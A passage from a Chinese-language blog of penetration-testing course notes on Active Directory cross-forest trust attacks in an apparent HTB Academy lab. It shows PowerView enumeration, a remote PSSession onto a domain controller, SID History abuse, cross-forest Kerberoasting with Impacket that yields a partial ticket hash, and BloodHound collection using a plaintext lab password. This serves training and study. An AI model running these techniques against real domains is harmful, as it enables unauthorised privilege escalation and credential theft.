class="hljs-variable">$MSSQLsvc</span>/sql01.freightlogstics:<span class="hljs-number">1433</span>@FREIGHTLOGISTICS.LOCAL*<span class="hljs-variable">$</span>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h2 id="管理员密码重用与组权限"><a href="#管理员密码重用与组权限" class="headerlink" title="管理员密码重用与组权限"></a>管理员密码重用与组权限</h2><p>时不时地，我们会遇到一种情况，即由同一家公司的管理员管理的双向林信任。如果我们能够接管域 A 并获取内置管理员账户（或属于域 A 中企业管理员或域管理员组的账户）的明文密码或 NT 哈希，而域 B 中存在一个具有相同名称的高权限账户，那么值得检查这两个林之间的密码重用情况。我偶尔会遇到这样的问题，例如，域 A 中有一个名为 <code>adm_bob.smith</code> 的用户在域管理员组中，而域 B 中有一个名为 <code>bsmith_admin</code> 的用户。有时，用户会在两个域中使用相同的密码，而拥有域 A 会立即赋予我对域 B 的完全管理权限。</p>
<h3 id="使用-Get-DomainForeignGroupMember"><a href="#使用-Get-DomainForeignGroupMember" class="headerlink" title="使用 Get-DomainForeignGroupMember"></a>使用 Get-DomainForeignGroupMember</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainForeignGroupMember</span> <span class="hljs-literal">-Domain</span> FREIGHTLOGISTICS.LOCAL<br><br>GroupDomain             : FREIGHTLOGISTICS.LOCAL<br>GroupName               : Administrators<br>GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL<br>MemberDomain            : FREIGHTLOGISTICS.LOCAL<br>MemberName              : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-500</span><br>MemberDistinguishedName : CN=S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-500</span>,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS<br>                          TICS,DC=LOCAL<br><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Convert-SidToName</span> S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-500</span><br><br>INLANEFREIGHT\administrator<br></code></pre></td></tr></table></figure>

<h3 id="使用-Enter-PSSession-访问-DC03"><a href="#使用-Enter-PSSession-访问-DC03" class="headerlink" title="使用 Enter-PSSession 访问 DC03"></a>使用 Enter-PSSession 访问 DC03</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Enter-PSSession</span> <span class="hljs-literal">-ComputerName</span> ACADEMY<span class="hljs-literal">-EA-DC03</span>.FREIGHTLOGISTICS.LOCAL <span class="hljs-literal">-Credential</span> INLANEFREIGHT\administrator<br><br>[<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC03.FREIGHTLOGISTICS.LOCAL</span>]: <span class="hljs-built_in">PS</span> C:\Users\administrator.INLANEFREIGHT\Documents&gt; whoami<br>inlanefreight\administrator<br><br>[<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC03.FREIGHTLOGISTICS.LOCAL</span>]: <span class="hljs-built_in">PS</span> C:\Users\administrator.INLANEFREIGHT\Documents&gt; ipconfig /all<br><br>Windows IP Configuration<br><br>   Host Name . . . . . . . . . . . . : ACADEMY<span class="hljs-literal">-EA-DC03</span><br>   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL<br>   Node <span class="hljs-built_in">Type</span> . . . . . . . . . . . . : Hybrid<br>   IP Routing Enabled. . . . . . . . : No<br>   WINS Proxy Enabled. . . . . . . . : No<br>   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL<br></code></pre></td></tr></table></figure>

<h2 id="SID-历史记录滥用-跨林"><a href="#SID-历史记录滥用-跨林" class="headerlink" title="SID 历史记录滥用 - 跨林"></a>SID 历史记录滥用 - 跨林</h2><p>SID History 也可能被滥用跨越林信任。如果一个用户从一个林迁移到另一个林，且未启用 SID 过滤，则可以添加来自另一个林的 SID，并在跨信任进行身份验证时，此 SID 将被添加到用户的令牌中。如果林 A 中具有管理权限的账户的 SID 被添加到林 B 中某个账户的 SID History 属性中，假设他们能够跨林进行身份验证，那么该账户在访问合作伙伴林中的资源时将拥有管理权限。在下图中，我们可以看到 <code>jjones</code> 用户从 <code>INLANEFREIGHT.LOCAL</code> 域迁移到不同林中的 <code>CORP.LOCAL</code> 域的示例。如果在进行此迁移时未启用 SID 过滤，并且用户在 <code>INLANEFREIGHT.LOCAL</code> 域中拥有管理权限（或任何类型的有趣权限，如 ACE 条目、访问共享等），那么他们将在成为第二个林中 <code>CORP.LOCAL</code> 新域的成员时，保留在 <code>INLANEFREIGHT.LOCAL</code> 中的管理权限&#x2F;访问权限。</p>
<h2 id="跨林-Kerberoasting-Linux"><a href="#跨林-Kerberoasting-Linux" class="headerlink" title="跨林 Kerberoasting(Linux)"></a>跨林 Kerberoasting(Linux)</h2><h3 id="使用-GetUserSPNs-py"><a href="#使用-GetUserSPNs-py" class="headerlink" title="使用 GetUserSPNs.py"></a>使用 GetUserSPNs.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley<br><br>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation <br>-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------<br>MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  &lt;never&gt; <br></code></pre></td></tr></table></figure>

<h3 id="使用-request-标志"><a href="#使用-request-标志" class="headerlink" title="使用 -request 标志"></a>使用 -request 标志</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  <br><br>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation <br>-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------<br>MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  &lt;never&gt;               <br><br><br>$krb5tgs$23$*mssqlsvc<span class="hljs-variable">$FREIGHTLOGISTICS</span>.LOCAL<span class="hljs-variable">$FREIGHTLOGISTICS</span>.LOCAL/mssqlsvc*<span class="hljs-variable">$10</span>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<p>假设我们能够跨信任关系进行 Kerberoast 攻击，并且在当前域中已无计可施。在这种情况下，尝试使用破解的密码进行一次单次密码喷洒也是值得的，因为如果相同的管理员负责两个域，该密码可能被用于其他服务账户。这里，我们再次展示了迭代测试的重要性，以及不遗余力地探索所有可能性。</p>
<h2 id="使用-Bloodhound-python-追踪外部组成员身份"><a href="#使用-Bloodhound-python-追踪外部组成员身份" class="headerlink" title="使用 Bloodhound-python 追踪外部组成员身份"></a>使用 Bloodhound-python 追踪外部组成员身份</h2><p>如上一节所述，我们可能会不时看到来自一个域的用户或管理员成为另一个域中某个组的成员。由于只有 <code>Domain Local Groups</code> 允许来自其森林外的用户，因此在处理双向森林信任关系时，看到来自域 A 的高权限用户成为域 B 内置管理员组的成员并不罕见。如果我们从 Linux 主机进行测试，可以使用 BloodHound 的 Python 实现来收集这些信息。我们可以利用此工具从多个域收集数据，将其导入 GUI 工具并搜索这些关系。</p>
<h3 id="针对-INLANEFREIGHT-LOCAL-运行-bloodhound-python"><a href="#针对-INLANEFREIGHT-LOCAL-运行-bloodhound-python" class="headerlink" title="针对 INLANEFREIGHT.LOCAL 运行 bloodhound-python"></a>针对 INLANEFREIGHT.LOCAL 运行 bloodhound-python</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ <span class="hljs-built_in">cat</span> /etc/resolv.conf <br><br><span class="hljs-comment"># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)</span><br><span class="hljs-comment">#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN</span><br><span class="hljs-comment"># 127.0.0.53 is the systemd-resolved stub resolver.</span><br><span class="hljs-comment"># run &quot;resolvectl status&quot; to see details about the actual nameservers.</span><br><br><span class="hljs-comment">#nameserver 1.1.1.1</span><br><span class="hljs-comment">#nameserver 8.8.8.8</span><br>domain INLANEFREIGHT.LOCAL<br>nameserver 172.16.5.5<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2<br><br>INFO: Found AD domain: inlanefreight.local<br>INFO: Connecting to LDAP server: ACADEMY-EA-DC01<br>INFO: Found 1 domains<br>INFO: Found 2 domains <span class="hljs-keyword">in</span> the forest<br>INFO: Found 559 computers<br>INFO: Connecting to LDAP server: ACADEMY-EA-DC01<br>INFO: Found 2950 <span class="hljs-built_in">users</span><br>INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL<br>INFO: Found 183 <span class="hljs-built_in">groups</span><br>INFO: Found 2 trusts<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h1 id="总结思考"><a href="#总结思考" class="headerlink" title="总结思考"></a>总结思考</h1><p>吸收关于 Active Directory 安全的所有知识，并熟悉不同团队和威胁行为者使用的战术、技术和程序（TTPs），将使我们走得更远。MITRE 的企业攻击矩阵是一个研究攻击及其相应工具和防御的好地方。AD 是一个广阔的主题，需要时间来掌握。新的漏洞向量和概念验证攻击经常发布。这个话题不会消失，因此利用现有资源保持领先地位，并保持网络的主动安全。无论是作为渗透测试人员还是防御者，对 AD 及其相关工具的基本理解将使我们保持最新状态。我们对大局了解得越多，作为攻击者和防御者，我们的能力就越强，我们能为客户和我们所服务的公司提供的价值就越大。提升安全性是我们的重点，但这并不意味着我们不能在过程中享受乐趣。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CPTS/" class="category-chain-item">CPTS</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CPTS/" class="print-no-link">#CPTS</a>
      
        <a href="/tags/CAPE/" class="print-no-link">#CAPE</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>AD Notes</div>
      <div>http://c2tsh4rk.github.io/2025/03/04/ADNotes/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>c2tsh4rk</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年3月4日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/03/17/Pivoting-Tunneling-and-Port-Forwarding/" title="Pivoting, Tunneling, and Port Forwarding">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Pivoting, Tunneling, and Port Forwarding</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/02/19/Password-Attacks/" title="Password Attacks">
                        <span class="hidden-mobile">Password Attacks</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
